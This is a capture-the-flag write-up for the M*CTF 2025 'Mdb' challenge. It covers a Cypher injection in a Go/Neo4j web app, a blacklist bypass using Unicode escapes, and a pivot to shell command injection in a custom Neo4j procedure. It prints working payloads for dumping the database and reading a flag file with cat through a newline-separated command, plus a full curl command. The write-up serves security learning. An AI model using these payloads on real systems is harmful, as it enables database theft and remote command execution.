# M*CTF 2025 - Mdb
@lilsadfoqs

<img width="790" height="360" alt="image" src="https://github.com/user-attachments/assets/e1400300-af3f-425e-9ffb-d4b4698e6c92" />


### **Summary**

This was a fascinating and multi-layered web challenge that began with a Cypher Injection vulnerability protected by a seemingly robust WAF (Web Application Firewall). The exploitation process required bypassing this WAF using a sophisticated Unicode escape technique, which then allowed for a full database dump. However, the real flag was not in the database but hidden on the server's filesystem. The final step required pivoting from the Cypher Injection to a Command Injection vulnerability, discovered within a custom Neo4j Java procedure, to finally read the flag and solve the challenge.

**Tools Used:**
*   `curl`
*   Web Browser & Developer Tools
*   A text editor

---

### **Phase 1: Initial Analysis and Vulnerability Identification**

The challenge provided the source code for a web application written in Go, using the Gin framework and a Neo4j graph database.

Analyzing the `main.go` file revealed the primary API endpoints:
*   `POST /movies`: Create a new movie.
*   `PUT /movies/:id`: Update a movie.
*   `GET /movies/getActors`: Get actors for a movie based on its `title`.

A code review of the handler functions quickly identified the weak point:

1.  **`CreateMovie` and `UpdateMovie` (Secure):** Both of these functions correctly used **parameterized queries**. User input was passed safely, posing no risk of injection.

2.  **`GetMovieActors` (Critically Vulnerable):** This function constructed its query using **direct string concatenation**, a classic sign of an injection vulnerability.

    <img width="924" height="822" alt="image" src="https://github.com/user-attachments/assets/31e21032-0c2f-447a-8ccf-bea795f63576" />

    ```go
    // The vulnerability is here! The `title` variable is concatenated directly into the query string.
    query := "MATCH (:Movie {title: '" + title + "' })<-[:ACTED_IN]-(actor:Person) RETURN actor" 
    ```
    The author attempted to mitigate this with a simple blacklist:
    ```go
    blocked := ",!@ ;'|&${}<>"
    ```
    Our objective was to bypass this blacklist to exploit the Cypher Injection vulnerability.

### **Phase 2: The War Against the WAF - Finding a Way Through**

This was the most arduous and methodical phase, requiring systematic testing and elimination of possibilities.

*   **Failure #1 - Single Quote (`'`):** The most basic injection attempt, `title=a'`, was immediately blocked by the WAF, returning `{"error":"Forbidden characters!"}`.
*   **Failure #2 - Double Quote (`"`):** A common technique is to try other quotation characters. The payload `title=a"` bypassed the WAF but only returned `{"result":null}`. This was because the original query string was enclosed in single quotes, so the double quote was treated as a literal character.
*   **Breakthrough #1 - The Backslash (`\`):** I discovered that the `\` character was not on the blacklist.
    *   The payload `title=a\` caused a `Neo.ClientError.Statement.SyntaxError`. This proved that the `\` had escaped the programmer's closing `'`, breaking the syntax and giving us control over the query. This was our first **golden proof**.
    *   The payload `title=a\a` returned `{"result":null}`. This proved that `\` only escaped the character immediately following it, leaving the rest of the query syntactically valid. I had discovered a reliable ERROR / NO-ERROR "binary switch".
*   **The `}` Wall:** To fix the syntax broken by our `\` injection, I needed to inject a `}` character. However, `}` was on the blacklist. I tried every conceivable method to bypass this:
    *   Lowercase URL Encoding (`%7d`): Blocked.
    *   Uppercase URL Encoding (`%7D`): Blocked.
    *   Double URL Encoding (`%257d`): Bypassed the WAF, but the server didn't decode it a second time.
    *   Homoglyph Attack (`%ef%bd%9d`): Bypassed the WAF, but Neo4j didn't recognize it as a `}`.

### **Phase 3: The Decisive Breakthrough - The Unicode Escape Technique**

When all standard paths seemed closed, I realized the core difference between the WAF and the Database:
*   **The WAF (written in Go):** Checked the raw input string.
*   **The Neo4j Driver:** Was "smarter" and capable of interpreting **Unicode escape sequences (`\uXXXX`)**.
*   Credit to this article I found when I searched "Cypher Injection" on Google: https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits#tricks

    <img width="734" height="644" alt="image" src="https://github.com/user-attachments/assets/e5854020-4b2c-41e9-9163-3e061d4256cd" />

I constructed a test payload: `title=\u0027\u002c\u007d\u0020`
*   The WAF saw the literal characters `\`, `u`, `0`, `0`, `2`, `7`... and let the request pass.
*   The Neo4j driver saw `\u0027` and translated it into a real `'` character.
*   **Result:** A `SyntaxError` from Neo4j, proving **the WAF was completely bypassed**. I could now generate any character I wanted.
*   <img width="880" height="191" alt="image" src="https://github.com/user-attachments/assets/c0f83a35-358d-4f68-9bda-2883347f5040" />


### **Phase 4: Dumping the Database and the "Fake Flag" Trap**

With the ability to generate any character, I crafted a perfect payload to dump the entire database. This process also required step-by-step debugging:
1.  **Initial Payload:** `... UNION MATCH (n) RETURN properties(n) ...` -> Caused an error due to improper closing syntax.
2.  **Syntax Fix:** Reordered the closing characters to `'\u0027\u007d\u0029` -> Caused a `Query cannot conclude with MATCH` error.
3.  **Final Payload:** Added `RETURN null AS actor` to the first half of the `UNION` to make it a complete query.

**The Winning Payload (for dumping the DB):**
`\u0027\u007d\u0029\u0020RETURN\u0020null\u0020AS\u0020actor\u0020UNION\u0020MATCH\u0020(n)\u0020RETURN\u0020properties(n)\u0020AS\u0020actor\u0020\u002f\u002f`

The result was a massive JSON object containing the entire database. I saw many flags in the format `MCTF{...}`. However, a sharp analysis revealed that the `POST /movies` endpoint was public, meaning all of these flags were **fakes** planted by other players. The `/api/graph` endpoint was a similar dead end.
<img width="874" height="53" alt="image" src="https://github.com/user-attachments/assets/1516bf5f-7a0b-4767-bc9f-6132f7082c47" />

This was me btw :Đ
### **Phase 5: The Pivot - From Cypher Injection to Command Injection**

The most critical evidence came from the `Dockerfile` and the custom Java procedure source code, `ValidateConfigProc.java`.

*   **Dockerfile:** Revealed that the flag was copied to `/tmp/flag_<64-character_random_hash>`. The filename was impossible to guess. It also showed that a custom Java procedure was loaded into Neo4j.
*   <img width="1021" height="407" alt="image" src="https://github.com/user-attachments/assets/fc53be1f-d5df-4f37-bf66-f48e62288189" />

*   **ValidateConfigProc.java:**
    *   Revealed the exact procedure name: `example.validateConfig`.
    *   <img width="1041" height="966" alt="image" src="https://github.com/user-attachments/assets/37a20163-a3dd-456a-8f14-bfbe2c6d52df" />

    *   Revealed a second, critical vulnerability: a classic **Command Injection**. The `outFile` parameter was concatenated directly into a `wget` shell command.
    *   Revealed a new blacklist for the command injection: `";|&><*\\"`.

### **Phase 6: Achieving Victory - Exploiting the Command Injection**

The final goal was to read the randomly named flag file.
*   **Challenge #1: Wildcards:** The `*` character was blocked.
    *   **Solution:** The filename had a fixed length (64-char SHA256 hash). I used 64 `?` characters (Unicode: `\u003f`) to match the filename since it's not in the blocked list (`";|&><*\\"`).
*   **Challenge #2: Command Chaining:** The `;`, `|`, and `&` characters were all blocked.
    *   **Solution:** The **newline character (`\n`, Unicode: `\u000a`)** was not blocked and acts as a command separator in the shell. (shell tricks hit hardd :Đ)

I crafted the final command injection payload:
`pwnedByFoqs\u000acat\u0020\u002ftmp\u002fflag_...<64 question marks>...`

This payload was then injected into our Cypher Injection payload, using Unicode escapes to bypass the initial WAF.

**The final, perfect payload:**
`\u0027\u007d\u0029\u0020RETURN\u0020null\u0020AS\u0020actor\u0020UNION\u0020CALL\u0020example.validateConfig\u0028\u0027pwnedByFoqs\u000acat\u0020\u002ftmp\u002fflag_...<64 \u003f's>...\u0027\u0029\u0020YIELD\u0020output\u0020RETURN\u0020output\u0020AS\u0020actor\u0020\u002f\u002f`

**The Final `curl` Command:**
```bash
curl "mdb.mctf.ru/api/movies/getActors?title=\u0027\u007d\u0029\u0020RETURN\u0020null\u0020AS\u0020actor\u0020UNION\u0020CALL\u0020example.validateConfig\u0028\u0027pwnedByFoqs\u000acat\u0020\u002ftmp\u002fflag_\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u003f\u0027\u0029\u0020YIELD\u0020output\u0020RETURN\u0020output\u0020AS\u0020actor\u0020\u002f\u002f"
```
<img width="875" height="231" alt="image" src="https://github.com/user-attachments/assets/14c78f3a-1a31-499d-8c84-1c2ab7c6c9c7" />

**Result:**
`{"result":[{"actor":null},{"actor":"FLAG=MCTF{1_l0ve_gR4phS_s0_mUCH....}"}]}`

### **Conclusion**

This was an outstanding CTF challenge that required persistence, logical deduction, and the ability to combine multiple attack techniques. It teaches us to:
1.  Always thoroughly analyze source code and static client-side files.
2.  Approach WAF bypassing systematically through testing and elimination.
3.  Understand the subtle but critical differences between how a WAF and a backend application interpret input.
4.  Always be ready to pivot from one vulnerability type to another as new information becomes available.

A truly fantastic journey.
